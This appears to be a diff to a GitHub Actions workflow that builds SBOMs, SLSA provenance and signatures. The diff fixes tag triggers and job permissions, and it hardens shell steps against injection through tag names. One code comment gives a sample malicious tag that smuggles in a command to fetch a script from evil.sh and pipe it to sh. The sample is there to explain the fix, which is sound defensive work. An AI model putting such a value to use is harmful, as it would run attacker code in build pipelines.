@@ -13,9 +13,16 @@
 # slsa-verifier CLIs — see CONTRIBUTING.md "Verifying supply chain" section.
 #
 # Triggers:
-#   - On any tag matching `v*.*.*`           (production releases)
+#   - On any release tag                       (production releases)
 #   - Manual dispatch                          (testing)
-#   - On push to `main` that touches packages/ (preview attestations)
+#
+# Tag patterns: changesets tags every package independently as
+# `<package-name>@<semver>` (e.g. `eslint-plugin-secure-coding@3.7.1`) and never
+# produces a bare `v*.*.*`. Matching only `v*.*.*` meant this workflow had never
+# once fired on a real release — so despite building SBOMs, SLSA provenance and
+# cosign signatures, no GitHub Release has ever actually carried one, and
+# OpenSSF Scorecard's Signed-Releases check reports "no releases found".
+# Both patterns are listed so a manual `v1.2.3` tag still works.
 
 name: Supply-chain attestation
 
@@ -23,6 +30,7 @@ on:
   push:
     tags:
       - 'v*.*.*'
+      - '*@*.*.*'
   workflow_dispatch:
     inputs:
       packages:
@@ -44,7 +52,13 @@ jobs:
     runs-on: ubuntu-latest
     timeout-minutes: 30
     permissions:
-      contents: read
+      # `write`, not `read`: the final step uploads the bundle to the GitHub
+      # Release via softprops/action-gh-release, which fails with
+      # "403 Resource not accessible by integration" under contents: read.
+      # With the tag trigger previously never matching a real release tag, that
+      # step had never executed, so the wrong scope was never exercised.
+      # Top-level `permissions:` stays read-only; only this job is elevated.
+      contents: write
       id-token: write           # sigstore + SLSA OIDC token
       attestations: write       # actions/attest-build-provenance
       packages: write           # push attestations / image to GHCR
@@ -66,22 +80,51 @@ jobs:
 
       - name: Resolve target packages
         id: targets
+        # `github.ref_name` and `inputs.packages` arrive through `env:`, never
+        # by `${{ }}` interpolation into the script body. Git permits `"`, `;`
+        # and `$` in a tag name, so a pushed tag like
+        #   pkg@1.0.0"; curl evil.sh | sh; #
+        # would otherwise be spliced into this shell verbatim.
+        # Every resolved name is then re-validated against a strict charset so
+        # nothing unexpected can reach the word-split loops downstream.
+        env:
+          REF_NAME: ${{ github.ref_name }}
+          REQ: ${{ inputs.packages || 'all' }}
         run: |
+          set -euo pipefail
           DEFAULT="eslint-mcp-base eslint-formatter-sarif \
                    secure-coding-mcp browser-security-mcp node-security-mcp crypto-mcp jwt-mcp \
                    express-security-mcp lambda-security-mcp mongodb-security-mcp nestjs-security-mcp \
                    vercel-ai-security-mcp pg-mcp"
-          REQ="${{ inputs.packages || 'all' }}"
-          if [ "$REQ" = "all" ]; then
-            echo "list=$DEFAULT" >> "$GITHUB_OUTPUT"
+          if [ "$REQ" != "all" ]; then
+            LIST=$(printf '%s' "$REQ" | tr ',' ' ')
+          elif printf '%s' "$REF_NAME" | grep -q '@'; then
+            # changesets tag `<package-dir>@<semver>` — attest exactly the
+            # package this release is for. Attaching the whole default fleet to
+            # a single package's release would ship 13 unrelated tarballs.
+            LIST="${REF_NAME%@*}"
           else
-            echo "list=$(echo "$REQ" | tr ',' ' ')" >> "$GITHUB_OUTPUT"
+            LIST="$DEFAULT"
           fi
 
+          # Reject anything that is not a plain npm directory name.
+          for PKG in $LIST; do
+            case "$PKG" in
+              *[!A-Za-z0-9._-]*|'')
+                echo "::error::Refusing unsafe package name: $PKG"
+                exit 1
+                ;;
+            esac
+          done
+
+          echo "list=$LIST" >> "$GITHUB_OUTPUT"
+
       - name: Pack tarballs (one per package)
+        env:
+          TARGETS: ${{ steps.targets.outputs.list }}
         run: |
           mkdir -p artifacts/tarballs
-          for PKG in ${{ steps.targets.outputs.list }}; do
+          for PKG in $TARGETS; do
             DIR="packages/$PKG"
             [ -d "$DIR" ] || { echo "::warning::missing $DIR"; continue; }
             ( cd "$DIR" && npm pack --pack-destination "$GITHUB_WORKSPACE/artifacts/tarballs" )
@@ -90,10 +133,12 @@ jobs:
 
       # ───────── SBOM (CycloneDX + SPDX) ─────────────────────────────────
       - name: Generate SBOM (CycloneDX) per package
+        env:
+          TARGETS: ${{ steps.targets.outputs.list }}
         run: |
           npm install -g @cyclonedx/cyclonedx-npm@4.2.1
           mkdir -p artifacts/sbom
-          for PKG in ${{ steps.targets.outputs.list }}; do
+          for PKG in $TARGETS; do
             DIR="packages/$PKG"
             [ -d "$DIR" ] || continue
             cyclonedx-npm --output-file "artifacts/sbom/$PKG.cyclonedx.json" --output-format json "$DIR" || \
@@ -149,7 +194,7 @@ jobs:
             artifacts/osv-report.json
 
       - name: Attach attestation bundle to release (when tag-triggered)
-        if: startsWith(github.ref, 'refs/tags/v')
+        if: startsWith(github.ref, 'refs/tags/')
         uses: softprops/action-gh-release@3d0d9888cb7fd7b750713d6e236d1fcb99157228 # v3
         with:
           files: |
@@ -161,13 +206,17 @@ jobs:
 
       - name: Summary
         if: always()
+        env:
+          EVENT_NAME: ${{ github.event_name }}
+          REF_NAME: ${{ github.ref_name }}
+          TARGETS: ${{ steps.targets.outputs.list }}
         run: |
           {
             echo "## Supply-chain attestation"
             echo ""
-            echo "- Trigger: ${{ github.event_name }}"
-            echo "- Tag: ${{ github.ref_name }}"
-            echo "- Packages: $(echo '${{ steps.targets.outputs.list }}' | wc -w)"
+            echo "- Trigger: $EVENT_NAME"
+            echo "- Tag: $REF_NAME"
+            echo "- Packages: $(printf '%s' "$TARGETS" | wc -w)"
             echo ""
             echo "Verification (consumer):"
             echo '```bash'
